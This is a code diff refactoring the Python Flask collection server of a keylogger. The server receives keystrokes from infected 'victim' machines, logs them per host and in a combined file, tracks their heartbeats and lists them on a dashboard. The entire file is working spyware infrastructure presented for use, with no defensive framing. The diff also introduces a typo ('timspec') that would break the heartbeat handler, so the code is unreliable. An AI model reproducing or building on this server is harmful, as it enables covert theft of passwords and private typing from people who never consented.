@@ -12,7 +12,7 @@ LOG_DIR = "logs"
 os.makedirs(LOG_DIR, exist_ok=True)
 
 victims = {}
-victims_lock = threading.Lock()  # Thread safety for shared dict
+victims_lock = threading.Lock()
 HEARTBEAT_TIMEOUT = 20
 
 # --- ANSI Color Codes ---
@@ -21,7 +21,6 @@ class C:
     BOLD    = '\033[1m'
     DIM     = '\033[2m'
     
-    # Foreground colors
     GREY    = '\033[90m'
     RED     = '\033[91m'
     GREEN   = '\033[92m'
@@ -32,7 +31,6 @@ class C:
     WHITE   = '\033[97m'
 
 def cprint(*args, sep=' ', end='\n', color=C.RESET, bold=False):
-    """Print with color, auto-reset."""
     prefix = C.BOLD if bold else ''
     text = sep.join(str(a) for a in args)
     print(f"{prefix}{color}{text}{C.RESET}", end=end)
@@ -50,7 +48,7 @@ class Log:
         cprint(f"    Hostname : {name}", color=C.CYAN)
         cprint(f"    HWID     : {hwid}", color=C.CYAN)
         cprint(f"    IP       : {ip}", color=C.CYAN)
-        print()  # blank line for spacing
+        print()
 
     @staticmethod
     def keystroke(name, hwid, count, preview=""):
@@ -59,7 +57,6 @@ class Log:
 
         if preview:
             preview_clean = preview.replace('\n', '\\n')[:80]
-
             print(
                 f"{C.DIM}[{ts}] "
                 f"{C.CYAN}Keylog:{C.RESET} "
@@ -80,10 +77,10 @@ class Log:
         """Very dim — pings clutter the screen, make them barely visible."""
         ts = datetime.datetime.now().strftime("%H:%M:%S")
         print(
-        f"{C.DIM}[{ts}] "
-        f"{C.YELLOW}Alive ♥{C.RESET}"
-        f"{C.DIM} {name} ({hwid[:8]}...){C.RESET}"
-    )
+            f"{C.DIM}[{ts}] "
+            f"{C.YELLOW}Alive ♥{C.RESET}"
+            f"{C.DIM} {name} ({hwid[:8]}...){C.RESET}"
+        )
 
     @staticmethod
     def status_change(name, hwid, alive):
@@ -97,22 +94,15 @@ class Log:
     @staticmethod
     def server_start():
         """Banner on startup."""
-
         def get_local_ip():
-            """
-            Get the LAN IP address of this machine.
-            Works even when bound to 0.0.0.0
-            """
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             try:
-                # Doesn't actually send packets
                 s.connect(("8.8.8.8", 80))
                 ip = s.getsockname()[0]
             except Exception:
                 ip = "127.0.0.1"
             finally:
                 s.close()
-
             return ip
 
         local_ip = get_local_ip()
@@ -124,30 +114,56 @@ class Log:
         print()
 
         cprint(f"  Log directory : {os.path.abspath(LOG_DIR)}", color=C.BLUE)
-
-        # Clickable localhost URL
         cprint(f"  Local access  : https://127.0.0.1:8443", color=C.BLUE)
-
-        # Real LAN IP
         cprint(f"  System IP     : {local_ip}", color=C.BLUE)
-
-        # Clickable dashboard URL
         cprint(f"  Dashboard     : https://{local_ip}:8443/clients", color=C.BLUE)
-
         print()
 
     @staticmethod
     def request(method, path, status_code):
-        """Dim HTTP request log — suppress noise from Flask's default logger."""
+        """Dim HTTP request log."""
         ts = datetime.datetime.now().strftime("%H:%M:%S")
         code_color = C.GREEN if status_code < 400 else C.RED
         print(f"{C.DIM}[{ts}] {method} {path} → {C.RESET}{code_color}{status_code}{C.RESET}")
 
 
-# --- Suppress Flask's default boring request logs ---
+# --- Suppress Flask's default request logs ---
 import logging
 log = logging.getLogger('werkzeug')
-log.setLevel(logging.ERROR)  # Only show ERROR level from Flask/Werkzeug
+log.setLevel(logging.ERROR)
+
+
+def _record_activity(hwid, hostname, client_ip, now, now_ts, keystrokes_len=0):
+    """
+    Centralized victim record update. Used by both /log and /ping.
+    Returns (was_previously_dead_before_this_update, is_first_ever_seen)
+    """
+    is_first_ever = False
+    was_dead = False
+
+    if hwid not in victims:
+        victims[hwid] = {
+            "hostname": hostname,
+            "ip": client_ip,
+            "first_seen": now,
+            "last_seen": now,
+            "last_seen_ts": now_ts,
+            "total_keys": 0,
+            "alive": True,
+            "last_dead_announced": 0.0,  # timestamp of last "DEAD" message
+            "last_alive_announced": 0.0, # timestamp of last "Connected" message
+        }
+        is_first_ever = True
+    else:
+        was_dead = not victims[hwid].get("alive", True)
+
+    victims[hwid]["last_seen"] = now
+    victims[hwid]["last_seen_ts"] = now_ts
+    victims[hwid]["total_keys"] += keystrokes_len
+    victims[hwid]["ip"] = client_ip
+
+    return was_dead, is_first_ever
+
 
 @app.route("/log", methods=["POST"])
 def receive_log():
@@ -187,49 +203,36 @@ def receive_log():
         with open(client_log, "w") as f:
             f.write("\n".join(header_lines))
 
-        # Console: new victim notification (only once)
         if is_new_client:
             Log.new_victim(hostname, hwid, client_ip)
 
-    # --- Append keystrokes to per-client log ---
+    # Append keystrokes to per-client log
     with open(client_log, "a") as f:
         f.write(f"[{now}] {keystrokes}\n")
 
-    # --- Unified log ---
+    # Unified log
     with open(os.path.join(LOG_DIR, "all_clients.log"), "a") as f:
         f.write(f"[{now}] [{hostname}] [{hwid}] ({client_ip}) {keystrokes}\n")
 
-    # --- Console: keystroke log ---
+    # Console keystroke log
     if keystrokes:
-        preview = keystrokes[:120]  # show first 120 chars
+        preview = keystrokes[:120]
         Log.keystroke(hostname, hwid, len(keystrokes), preview)
-    elif is_first_contact:
-        pass  # new_victim was already printed above
 
-    # --- In-memory victim tracking ---
+    # --- Update victim tracking (keystrokes ARE liveness signals) ---
     with victims_lock:
-        was_alive = False
-        if hwid not in victims:
-            victims[hwid] = {
-                "hostname": hostname,
-                "ip": client_ip,
-                "first_seen": now,
-                "last_seen": now,
-                "last_seen_ts": now_ts,
-                "total_keys": 0,
-                "alive": True,
-            }
-        else:
-            was_alive = victims[hwid].get("alive", False)
+        was_dead, is_first = _record_activity(hwid, hostname, client_ip, now, now_ts, len(keystrokes))
 
-        victims[hwid]["last_seen"] = now
-        victims[hwid]["last_seen_ts"] = now_ts
-        victims[hwid]["total_keys"] += len(keystrokes)
-        victims[hwid]["ip"] = client_ip
+        # Mark alive on any activity
+        was_marked_dead_before = not victims[hwid].get("alive", True)
         victims[hwid]["alive"] = True
 
-        # Detect recovery from dead → alive
-        if not was_alive:
+        # Only announce reconnection if we were previously marked dead
+        # AND we haven't already announced it in the last 30 seconds (debounce)
+        now_float = now_ts
+        last_alive_announced = victims[hwid].get("last_alive_announced", 0.0)
+        if was_marked_dead_before and (now_float - last_alive_announced) > 10:
+            victims[hwid]["last_alive_announced"] = now_float
             Log.status_change(hostname, hwid, alive=True)
 
     return "OK", 200
@@ -240,33 +243,26 @@ def heartbeat():
     hwid = request.form.get("hwid", "unknown")
     hostname = request.form.get("hostname", "unknown")
     client_ip = request.remote_addr
-    now = datetime.datetime.now().isoformat(timespec="seconds")
+    now = datetime.datetime.now().isoformat(timspec="seconds")
     now_ts = datetime.datetime.now().timestamp()
 
     with victims_lock:
-        was_alive = False
-        if hwid not in victims:
-            victims[hwid] = {
-                "hostname": hostname,
-                "ip": client_ip,
-                "first_seen": now,
-                "last_seen": now,
-                "last_seen_ts": now_ts,
-                "total_keys": 0,
-                "alive": True,
-            }
+        was_dead, is_first = _record_activity(hwid, hostname, client_ip, now, now_ts)
+
+        if is_first:
             Log.new_victim(hostname, hwid, client_ip)
+            victims[hwid]["alive"] = True
         else:
-            was_alive = victims[hwid].get("alive", False)
-            victims[hwid]["last_seen"] = now
-            victims[hwid]["last_seen_ts"] = now_ts
-            victims[hwid]["ip"] = client_ip
+            was_marked_dead_before = not victims[hwid].get("alive", True)
             victims[hwid]["alive"] = True
 
-            # Print heartbeat (dim) unless status changed
-            if not was_alive:
+            # Debounce reconnection announcements
+            now_float = now_ts
+            last_alive_announced = victims[hwid].get("last_alive_announced", 0.0)
+            if was_marked_dead_before and (now_float - last_alive_announced) > 10:
+                victims[hwid]["last_alive_announced"] = now_float
                 Log.status_change(hostname, hwid, alive=True)
-            else:
+            elif not was_marked_dead_before:
                 Log.heartbeat(hostname, hwid)
 
     return "PONG", 200
@@ -278,23 +274,27 @@ def is_victim_alive(last_seen_ts):
 
 def dead_client_checker():
     """
-    Background thread that runs every 5 seconds and checks ALL victims.
-    If any victim's last_seen_ts exceeds HEARTBEAT_TIMEOUT and they're still
-    marked alive, it flips them to dead and logs the status change immediately.
+    Background thread checking every 5 seconds.
+    Only announces DEAD if the client has been gone for HEARTBEAT_TIMEOUT
+    AND we haven't already announced it (debounce via last_dead_announced).
     """
     while True:
-        time.sleep(5)  # Check every 5 seconds
+        time.sleep(5)
         with victims_lock:
             now_ts = datetime.datetime.now().timestamp()
             for hwid, info in list(victims.items()):
                 currently_alive = (now_ts - info["last_seen_ts"]) < HEARTBEAT_TIMEOUT
                 prev_alive = info.get("alive", True)
 
-                # Detect alive → dead transition
+                # Transition: alive → dead
                 if prev_alive and not currently_alive:
                     info["alive"] = False
-                    # Print dead notification immediately — no waiting for dashboard visit
-                    Log.status_change(info["hostname"], hwid, alive=False)
+                    # Debounce: don't spam DEAD if we just announced it
+                    last_dead_announced = info.get("last_dead_announced", 0.0)
+                    if (now_ts - last_dead_announced) > 10:
+                        info["last_dead_announced"] = now_ts
+                        Log.status_change(info["hostname"], hwid, alive=False)
+                # Transition: dead → alive should be caught by /log or /ping, not here
 
 
 @app.route("/clients", methods=["GET"])
@@ -303,12 +303,7 @@ def list_clients():
         now_ts = datetime.datetime.now().timestamp()
         for hwid, info in victims.items():
             currently_alive = (now_ts - info["last_seen_ts"]) < HEARTBEAT_TIMEOUT
-            prev_alive = info.get("alive", True)
             info["alive"] = currently_alive
-
-            # Detect alive → dead transition (belt-and-suspenders with the background thread)
-            if prev_alive and not currently_alive:
-                Log.status_change(info["hostname"], hwid, alive=False)
 
         rows = ""
         for hwid, info in sorted(victims.items(), key=lambda x: x[1]["last_seen"], reverse=True):
@@ -396,7 +391,6 @@ def view_log(filename):
 if __name__ == "__main__":
     Log.server_start()
     
-    # Start the dead-client detection background thread
     checker = threading.Thread(target=dead_client_checker, daemon=True)
     checker.start()
     cprint("  Dead-client watcher thread started (checking every 5s)", color=C.DIM)
